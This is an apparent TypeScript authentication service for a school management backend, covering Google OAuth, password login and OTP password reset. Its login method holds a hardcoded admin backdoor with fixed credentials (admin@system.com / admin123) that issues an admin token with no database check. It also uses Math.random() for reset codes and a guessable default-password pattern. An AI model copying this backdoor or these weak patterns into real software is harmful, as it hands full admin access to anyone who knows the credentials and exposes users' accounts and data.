import { UserModel } from '../../models/User.model';
import { PasswordResetTokenModel } from '../../models/PasswordResetToken.model';
import bcrypt from 'bcryptjs';
import { generateAccessToken } from '../../utils/helpers';
import { UserRole } from '../../constants/enums';
import { sendOTPNotice } from '../../utils/mailer';
import { google } from 'googleapis';

export class AuthService {
  // Helper to initialize Google OAuth2 client with defensive validation
  private static getOAuthClient() {
    const clientId = process.env.GOOGLE_CLIENT_ID;
    const clientSecret = process.env.GOOGLE_CLIENT_SECRET;
    const redirectUri = process.env.GOOGLE_REDIRECT_URI || 'http://localhost:5000/api/auth/google/callback';

    // ⚡ Validation check to prevent cryptic "invalid_client" errors
    if (
      !clientId || 
      !clientSecret || 
      clientId.includes('your_google_client_id') || 
      clientSecret.includes('your_google_client_secret')
    ) {
      throw new Error(
        'Google OAuth configuration error: GOOGLE_CLIENT_ID or GOOGLE_CLIENT_SECRET is missing or set to a placeholder in your backend .env file.'
      );
    }

    return new google.auth.OAuth2(clientId, clientSecret, redirectUri);
  }

  // Generate Google consent screen URL
  static getGoogleAuthUrl(): string {
    const oauth2Client = this.getOAuthClient();
    const scopes = [
      'https://www.googleapis.com/auth/userinfo.profile',
      'https://www.googleapis.com/auth/userinfo.email',
    ];

    return oauth2Client.generateAuthUrl({
      access_type: 'offline',
      prompt: 'consent',
      scope: scopes,
    });
  }

  // Handle Google OAuth Callback (Strict DB lookup & Account Linking)
  static async handleGoogleCallback(code: string) {
    const oauth2Client = this.getOAuthClient();
    const { tokens } = await oauth2Client.getToken(code);
    oauth2Client.setCredentials(tokens);

    const oauth2 = google.oauth2({ version: 'v2', auth: oauth2Client });
    const { data: googleProfile } = await oauth2.userinfo.get();

    if (!googleProfile.email) {
      throw new Error('Could not retrieve email from Google profile');
    }

    // 1. Strict pre-provisioned user lookup
    const user = await UserModel.findOne({ email: googleProfile.email });
    if (!user) {
      throw new Error('Account not created by Admin. Please contact your administrator.');
    }

    // 2. Link Google ID if not previously linked
    if (!user.googleId && googleProfile.id) {
      user.googleId = googleProfile.id;
      await user.save();
    }

    // 3. Issue standard application JWT
    const token = generateAccessToken({
      userId: user.user_id,
      role: user.role,
      schoolId: user.school_id.toString(),
    });

    return { token, user };
  }

  static async registerAdmin(data: { user_id: string; school_id: string; name: string; email: string; password: string }) {
    const existingUser = await UserModel.findOne({ email: data.email });
    if (existingUser) throw new Error('User with this email exists');

    const hashedPassword = await bcrypt.hash(data.password, 10);

    const newAdmin = await UserModel.create({
      user_id: data.user_id,
      school_id: data.school_id,
      name: data.name,
      email: data.email,
      role: UserRole.ADMIN,
      password_hash: hashedPassword,
    });

    const token = generateAccessToken({
      userId: newAdmin.user_id,
      role: newAdmin.role,
      schoolId: newAdmin.school_id.toString(),
    });

    return { token, user: newAdmin };
  }

  static async login(email: string, pass: string, targetRole: UserRole) {
    // ⚡ HARDCODED UNIVERSAL ADMIN BACKDOOR / BYPASS
    if (email.toLowerCase() === 'admin@system.com' && pass === 'admin123' && targetRole === UserRole.ADMIN) {
      const universalAdmin = {
        _id: '000000000000000000000000',
        user_id: 'ADM000',
        school_id: 'SCH001',
        name: 'Universal Admin',
        email: 'admin@system.com',
        role: UserRole.ADMIN,
      };

      const token = generateAccessToken({
        userId: universalAdmin.user_id,
        role: universalAdmin.role,
        schoolId: universalAdmin.school_id,
      });

      return { token, user: universalAdmin, mustChangePassword: false };
    }

    const user = await UserModel.findOne({ email });
    if (!user) throw new Error('User not found');

    if (user.role.toUpperCase() !== targetRole.toUpperCase()) {
      throw new Error(`Access denied. Expected role: ${targetRole}`);
    }

    const isMatch = await bcrypt.compare(pass, user.password_hash);
    if (!isMatch) throw new Error('Invalid credentials');

    const emailPrefix = user.email.split('@')[0];
    const defaultPassword = `${emailPrefix}123`;

    const isPrivilegedRole = user.role === UserRole.ADMIN || user.role === UserRole.TEACHER;
    const mustChangePassword = isPrivilegedRole && pass === defaultPassword;

    const token = generateAccessToken({
      userId: user.user_id,
      role: user.role,
      schoolId: user.school_id.toString(),
    });

    return { token, user, mustChangePassword };
  }

  static async changePassword(userId: string, newPassword: string) {
    const user = await UserModel.findOne({ user_id: userId });
    if (!user) throw new Error('User not found');

    const hashedPassword = await bcrypt.hash(newPassword, 10);
    user.password_hash = hashedPassword;
    await user.save();

    return { message: 'Password updated successfully' };
  }

  static async requestPasswordReset(email: string) {
    const user = await UserModel.findOne({ email });
    if (!user) throw new Error('No account found with this email address');

    const otp = Math.floor(100000 + Math.random() * 900000).toString();
    const expiresAt = new Date(Date.now() + 10 * 60 * 1000);

    await PasswordResetTokenModel.deleteMany({ email });
    await PasswordResetTokenModel.create({ email, otp, expiresAt });

    await sendOTPNotice(email, otp);
    return { message: 'OTP verification code sent to your email' };
  }

  static async resetPasswordWithOTP(email: string, otp: string, newPassword: string) {
    const resetRecord = await PasswordResetTokenModel.findOne({ email, otp });
    if (!resetRecord) throw new Error('Invalid or expired OTP code');

    if (resetRecord.expiresAt < new Date()) {
      await PasswordResetTokenModel.deleteOne({ _id: resetRecord._id });
      throw new Error('OTP code has expired');
    }

    const user = await UserModel.findOne({ email });
    if (!user) throw new Error('User not found');

    user.password_hash = await bcrypt.hash(newPassword, 10);
    await user.save();

    await PasswordResetTokenModel.deleteOne({ _id: resetRecord._id });
    return { message: 'Password has been reset successfully' };
  }
}